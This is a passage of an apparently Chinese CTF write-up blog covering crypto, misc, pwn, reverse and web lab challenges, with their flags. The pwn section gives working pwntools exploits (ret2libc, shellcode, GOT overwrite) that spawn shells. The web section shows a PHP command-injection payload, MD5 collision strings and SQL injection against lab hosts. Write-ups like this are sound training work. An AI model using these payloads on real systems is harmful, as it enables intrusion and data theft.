%r&#x27;%(k1, k2))</span><br><span class="line">    print(&#x27;k = %r&#x27;%k)</span><br><span class="line">    return (k1, k2), (a_1, timea1, b_1, timeb1, xc_1, yc_1)</span><br><span class="line"></span><br><span class="line">def LC(key, x, times, flags):</span><br><span class="line">    (k1, k2) = key</span><br><span class="line">    xn = []</span><br><span class="line">    xn.append(x)</span><br><span class="line">    if flags:</span><br><span class="line">        xn.append(1 - 2 * xn[0]**2)</span><br><span class="line">    else:</span><br><span class="line">        xn.append(k2 * xn[0]**3 + (1 - k2)*xn[0])</span><br><span class="line">    for i in range(times):</span><br><span class="line">        assert xn[i]&gt;=-1 and xn[i]&lt;=1 and xn[i+1]&gt;=-1 and xn[i+1]&lt;=1</span><br><span class="line">        if flags:</span><br><span class="line">            xn.append((1 - 2 * xn[i]**2)*(k1 * xn[i+1]**3 + (1 - k1)*xn[i+1]))</span><br><span class="line">        else:</span><br><span class="line">            xn.append((k2 * xn[i]**3 + (1 - k2)*xn[i])*(1 - 2 * xn[i+1]**2))</span><br><span class="line">    return xn[times + 1]</span><br><span class="line"></span><br><span class="line">def decrypt(key, data):</span><br><span class="line">    flag = &#x27;&#x27;</span><br><span class="line">    (k1, k2) = key</span><br><span class="line">    (a_1, timea1, b_1, timeb1, xc_1, yc_1) = data</span><br><span class="line">    miu, omiga = [], []</span><br><span class="line">    ta = timea1</span><br><span class="line">    tb = timeb1</span><br><span class="line">    for j in range(len(c)):</span><br><span class="line">        miu.append(LC(key, a_1, ta, 1))</span><br><span class="line">        omiga.append(LC(key, b_1, tb, 0))</span><br><span class="line">        for tmp in range(33, 127):</span><br><span class="line">            if c[j] == ((int(miu[-1] * 1000) + int(omiga[-1] * 1000)) ^ tmp) % 256:</span><br><span class="line">                flag += chr(tmp)</span><br><span class="line">        delta = c[j]/256</span><br><span class="line">        for i in range(3):</span><br><span class="line">            y = (yc_1 + delta) % 1</span><br><span class="line">            y = k1 * y**3 + (1 - k1) * y</span><br><span class="line">            x = xc_1</span><br><span class="line">            x = k2 * x**3 + (1 - k2) * x</span><br><span class="line">        ta = 3 + int(1000 * x) % 30</span><br><span class="line">        tb = 3 + int(1000 * y) % 30</span><br><span class="line">    return flag</span><br><span class="line"></span><br><span class="line">key, data = init()</span><br><span class="line">flag = decrypt(key, data)</span><br><span class="line">print(flag)</span><br><span class="line">#flag&#123;ii24nji9-8ckkpil1-5hiev3n6-1u24g07m&#125;</span><br></pre></td></tr></table></figure>
+<h2><span id="misc">Misc</span></h2><h3><span id="yesec-no-drumsticks-1">Yesec no drumsticks 1</span></h3><p><img src="1666971333098.png" alt></p>
+<h3><span id="qsdzs-girlfriend-1">qsdz’s girlfriend 1</span></h3><p><img src="1666971521832.png" alt></p>
+<p>用ARCHPR爆破。19900101开始到20200101，得到20031201。</p>
+<p><img src="1666971627999.png" alt></p>
+<p>用搜索引擎图片识别。</p>
+<p>flag{Hikari_20031201}</p>
+<h3><span id="look-my-eyes">Look my eyes</span></h3><p>SilentEye解密。</p>
+<p><img src="1666971798719.png" alt></p>
+<p><img src="1666971822266.png" alt></p>
+<p>解码默认设置就行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tMMG9rX20zXzFuX215X2V5M3N9</span><br><span class="line"></span><br><span class="line">flag&#123;L0ok_m3_1n_my_ey3s&#125;</span><br></pre></td></tr></table></figure>
+<h3><span id="ezsnake">EzSnake</span></h3><p>这道题有两种做法，可以直接改class，也可以反编译出java文件。</p>
+<ul>
+<li><p>反编译class，这也是我当时做法。首先用jd-gui打开，在actionPerformed函数中找到关键代码：</p>
+<p><img src="1667019848752.png" alt></p>
+</li>
+</ul>
+<p>将ezsnake.jar改成ezsnake.zip，解压。用jclasslib打开GamePanel.class文件。找到以下位置。</p>
+<p><img src="1667020179931.png" alt></p>
+<p><img src="1667020155135.png" alt></p>
+<p>将289行114改成1，保存。回到解压文件夹的根目录：</p>
+<p><img src="1667020357603.png" alt></p>
+<p>选中这个目录中三个文件夹，压缩成zip,后缀改成.jar。便可以运行了。吃一个就能够出结果：</p>
+<p><img src="1667020681801.png" alt></p>
+<p>我是放到ps里面补全的，其他工具也行。</p>
+<p>ZmxhZ3tZMHVfNHJlXzBuZV9vTmVfMG5FX3N0NFJ9=</p>
+<p>flag{Y0u_4re_0ne_oNe_0nE_st4R}</p>
+<ul>
+<li><p>jd-gui输出src文件。然后用eclipse打开，修改114为1：</p>
+<p><img src="1667022014024.png" alt></p>
+</li>
+</ul>
+<h3><span id="奇怪的音频">奇怪的音频。</span></h3><p>这题也有两种做法，一种win和一种linux。</p>
+<ul>
+<li>windows方法比较简单。mmsstv中RX模式，开着声音直接可以解出来，但是存在扫不出来的概率，前一天扫出来了，后一天可能就没有扫出来。</li>
+</ul>
+<p><img src="1667022960737.png" alt></p>
+<ul>
+<li><p>利用linux的qsstv。直接解会报错，所以我们需要先修改一下文件。</p>
+<p>首先去buuctf找到[UTCTF2020]sstv这道题。用audacity打开同时打开这两个文件。</p>
+<p>然后把这道”奇怪的音频“的波形复制到[UTCTF2020]sstv这道题音频的波形上，覆盖源波形，就可以用qsstv读取了。</p>
+<p><img src="1667024642603.png" alt></p>
+</li>
+</ul>
+<h2><span id="pwn">Pwn</span></h2><p>简单题就直接贴代码了。都是python3。</p>
+<h3><span id="ret2text">ret2text</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">pop_rdi_ret = 0x4007d3</span><br><span class="line">ret = 0x400566</span><br><span class="line">#context(log_level=&#x27;debug&#x27;)</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">print(p.recv(timeout=1))</span><br><span class="line">payload = b&#x27;a&#x27; * 0x20 + b&#x27;b&#x27; * 8 + p64(ret) +p64(0x400708)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3><span id="calc">calc</span></h3><p>这应该算misc题目吧。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">r = remote(&#x27;node4.buuoj.cn&#x27;, 25831)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">for i in range(100):</span><br><span class="line">	s = r.recvline()</span><br><span class="line">	Regex = r&#x27;(?=\?).*?(?&lt;=\=)&#x27;</span><br><span class="line">	f = re.search(Regex,s.decode())</span><br><span class="line">	f = f.group()[1:-1]</span><br><span class="line">	f = f.replace(&#x27;x&#x27;, &#x27;*&#x27;)</span><br><span class="line">	ans = eval(f)</span><br><span class="line">	r.sendline(str(ans).encode())</span><br><span class="line">	r.recvline()</span><br><span class="line">r.sendline(b&#x27;cat flag&#x27;)</span><br><span class="line">print(r.recvline(timeout=1))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3><span id="ret2libc">ret2libc</span></h3><p>好多师傅讲的很明白了：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40827990/article/details/86662079">https://blog.csdn.net/qq_40827990/article/details/86662079</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#0x0000000000400753 : pop rdi ; ret</span></span><br><span class="line">elf=ELF(<span class="string">&#x27; pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libc_sh = libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">libc_puts_addr = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400753</span></span><br><span class="line">start = <span class="number">0x400698</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;time?\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">32</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(p.recvline())	  </span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">base_addr = puts_addr - libc_puts_addr</span><br><span class="line">system_addr = base_addr + libc_system</span><br><span class="line">sh_addr = base_addr + libc_sh </span><br><span class="line">ret = <span class="number">0x40050e</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">32</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span>  + p64(ret) + p64(pop_rdi_ret) + p64(sh_addr) + p64(system_addr) + p64(start)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3><span id="ret2shellcode">ret2shellcode</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">print(len(shellcode))</span><br><span class="line">p = process(&quot;./pwn&quot;)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.recvline()</span><br><span class="line">payload = 0x30 * b&#x27;a&#x27; + 8 * b&#x27;b&#x27; + p64(0x233000)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3><span id="fallw1nds-gift">fallw1nd’s gift</span></h3><p>给了got表中puts指向的地址，也就是libc中put地址。然后在scanf输入got表中puts地址的值，为buf，在buf上输入libc中system地址，puts就变成了system，执行system(‘/bin/sh’);</p>
+<p><img src="1667030197038.png" alt></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;fallw1nd_gift&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line">libc_system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">libc_puts_addr = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(puts_plt)</span><br><span class="line"><span class="built_in">print</span>(puts_got)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0x401084</span></span><br><span class="line"><span class="comment">#0x4033f8</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./fallw1nd_gift&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">s = p.recvline().rstrip()</span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr = <span class="built_in">int</span>(s.decode(),<span class="number">16</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;0x4033f8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line">base_addr = puts_addr - libc_puts_addr</span><br><span class="line">system_addr = base_addr + libc_system</span><br><span class="line"></span><br><span class="line">payload = p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2><span id="reverse">Reverse</span></h2><h3><span id="hello_reverse">Hello_Reverse</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.rdata:0000000140003260	0000000D	C	flag&#123;h3llo_r</span><br><span class="line">strcpy(Source, &quot;3vers1ng_w0rld&#125;&quot;);</span><br><span class="line">flag&#123;h3llo_r3vers1ng_w0rld&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3><span id="baby_re">Baby_Re</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag = [#flag&#123;S0meth1ng_run_bef0re_main!&#125;0x66, 0x6D, 0x63, 0x64, 0x7F, 0x56, 54, 0x6A, 0x6D, 0x7D, 0x62, 58, 0x62, 0x6A, 0x51, 0x7D, </span><br><span class="line">    0x65, 0x7F, 0x4D, 0x71, 0x71, 0x73, 38, 0x65, 0x7D, 0x46, 0x77, 0x7A, 0x75, 0x73, 63, 0x62]</span><br><span class="line"></span><br><span class="line">flag_ = &quot;&quot;</span><br><span class="line">for i in range(len(flag)):</span><br><span class="line">    flag_ += chr(flag[i] ^ i)</span><br><span class="line">print(flag_)</span><br><span class="line">#flag&#123;S0meth1ng_run_bef0re_main!&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3><span id="pyre">Pyre</span></h3><ul>
+<li>exe to pyc:  <a target="_blank" rel="noopener" href="https://github.com/extremecoders-re/pyinstxtractor">https://github.com/extremecoders-re/pyinstxtractor</a> </li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python pyinstxtractor.py pyre.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>用010editor打开extracted文件夹下pyre和struct。将struct第一行复制到pyre中，保存pyre为pyre.pyc。</p>
+<p><img src="1667037496052.png" alt></p>
+<p><img src="1667037519263.png" alt></p>
+<ul>
+<li>pyc to py:   <code>pip install uncompyle6</code> </li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uncompyle6 pyre.pyc &gt; pyre.py</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>后面的代码非常容易理解了，直接上exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">table = [<span class="number">7</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">22</span>, <span class="number">19</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">18</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">17</span>]</span><br><span class="line">dics = &#123;&#125;</span><br><span class="line"></span><br><span class="line">encode = <span class="string">&#x27;REla&#123;PSF!!fg&#125;!Y_SN_1_0U&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table)):</span><br><span class="line">	dics[table[i]] = encode[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(table)):</span><br><span class="line">	flag += dics[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;PYRE_1S_S0_FUN!!!&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3><span id="easyre">EasyRe</span></h3><p><img src="1667037903600.png" alt></p>
+<p>找到dll中的encode函数，用ida进dll以后发现是encode_0函数，发现是base64。base64返回值做了一个异或加密，异或加密的str为‘Reverse’：</p>
+<p><img src="1667038032200.png" alt></p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">enc =   [    <span class="number">0x08</span>, <span class="number">0x08</span>, <span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x28</span>, <span class="number">0x40</span>, <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="number">0x3C</span>, <span class="number">0x2E</span>, <span class="number">0x2B</span>, <span class="number">0x1E</span>, <span class="number">0x3D</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, </span><br><span class="line">    <span class="number">0x3B</span>, <span class="number">0x3D</span>, <span class="number">0x3C</span>, <span class="number">0x15</span>, <span class="number">0x28</span>, <span class="number">0x05</span>, <span class="number">0x50</span>, <span class="number">0x46</span>, <span class="number">0x3F</span>, <span class="number">0x2A</span>, <span class="number">0x39</span>, <span class="number">0x09</span>, <span class="number">0x31</span>, <span class="number">0x56</span>, <span class="number">0x24</span>, <span class="number">0x1C</span>, </span><br><span class="line">    <span class="number">0x3F</span>, <span class="number">0x24</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, <span class="number">0x2C</span>, <span class="number">0x25</span>, <span class="number">0x23</span>, <span class="number">0x4B</span>]</span><br><span class="line"></span><br><span class="line">c = <span class="string">b&#x27;Reverse&#x27;</span></span><br><span class="line">c = <span class="built_in">list</span>(c)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">base = [enc[i] ^ c[i % <span class="built_in">len</span>(c)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(base))</span><br><span class="line">base = <span class="built_in">bytes</span>(base)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">flag = base64.b64decode(base.decode())</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;Base64_1s_1nterestr1ng!!&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3><span id="艾克体悟题">艾克体悟题</span></h3><p>我的安卓题做的不好，而且我比较懒= =开安卓模拟器需要把windows各种虚拟机关掉，我心爱的wsl2用不了实在是不好受= =还是看其他师傅写好的wp吧：<a target="_blank" rel="noopener" href="https://www.anyiblog.top/2022/09/25/20220925/">https://www.anyiblog.top/2022/09/25/20220925/</a></p>
+<h2><span id="web">Web</span></h2><h3><span id="http">HTTP</span></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#linux的curl语句，wsl2中做题记录,wsl2会自动加上&quot;\&quot;，不用管：</span></span><br><span class="line">curl http://f8c735fa-c209-437b-a2b4-4b6c44c489a9.node4.buuoj.cn:81/</span><br><span class="line">curl http://f8c735fa-c209-437b-a2b4-4b6c44c489a9.node4.buuoj.cn:81/?name=1</span><br><span class="line">curl http://f8c735fa-c209-437b-a2b4-4b6c44c489a9.node4.buuoj.cn:81/?name=1 -X POST -d <span class="string">&#x27;key=ctfisgood&#x27;</span></span><br><span class="line">curl http://f8c735fa-c209-437b-a2b4-4b6c44c489a9.node4.buuoj.cn:81/?name=1 -X POST -d <span class="string">&#x27;key=ctfisgood&#x27;</span> -H <span class="string">&#x27;cookie:user=admin&#x27;</span></span><br><span class="line"><span class="comment">#flag&#123;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3><span id="headheader">Head?Header!</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl node4.buuoj.cn:28006 -H &#x27;User-Agent:CTF&#x27; -v</span><br><span class="line">curl node4.buuoj.cn:28006 -H &#x27;User-Agent:CTF&#x27; -H &#x27;Referer:ctf.com&#x27; -v</span><br><span class="line">curl node4.buuoj.cn:28006 -H &#x27;User-Agent:CTF&#x27; -H &#x27;Referer:ctf.com&#x27; -H &#x27;X-Forwarded-For:127.0.0.1&#x27; -v</span><br><span class="line">#flag&#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3><span id="我真的会谢">我真的会谢</span></h3><p>题目提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Flag has three part, qsdz hid them in different files.</span><br><span class="line">By the way, these files are sensitive.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>在不同的文件里面，那么我么需要这些文件。dirsearch不能直接扫描buu的题目了，但其实延迟的参数就可以了。我的环境是wsl的kali：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://e4e77030-f04f-4879-835d-1d3e838f7007.node4.buuoj.cn:81/ -s 5</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="1667047014556.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://84bb312a-45f4-422d-a658-41aeacc1b243.node4.buuoj.cn:81/.index.php.swp</span><br><span class="line">vim .index.php.swp</span><br><span class="line">#part_two</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>另外两个在robots.txt和www.zip里面。</p>
+<h3><span id="notphp">NotPHP</span></h3><p>第一步，php伪协议：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain;base64,V2VsY29tZSB0byBDVEY=</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>第二步，利用md5的碰撞，两个字符串不一样但是加密相等。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_64201116/article/details/126493091里面提供了一个字符串。">https://blog.csdn.net/qq_64201116/article/details/126493091里面提供了一个字符串。</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br><span class="line"></span><br><span class="line">$b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>第三步，num可以在结尾添加%00绕过。</p>
+<p>第四步，cmd用%0a换行符绕过#。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd=%0asystem(&#x27;cat%20/flag&#x27;); </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>burpsuite包：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /?data=data://text/plain;base64,V2VsY29tZSB0byBDVEY=&amp;key1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&amp;key2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;cmd=%0asystem(&#x27;cat%20/flag&#x27;); HTTP/1.1</span><br><span class="line">Host: d384d440-c395-4839-a541-026d7937b84d.node4.buuoj.cn:81</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">num=2077%00</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3><span id="word-for-you">Word-For-You</span></h3><p>直接用sqlmap了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用&#x27; or 1=1#试了一下就都出来了。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
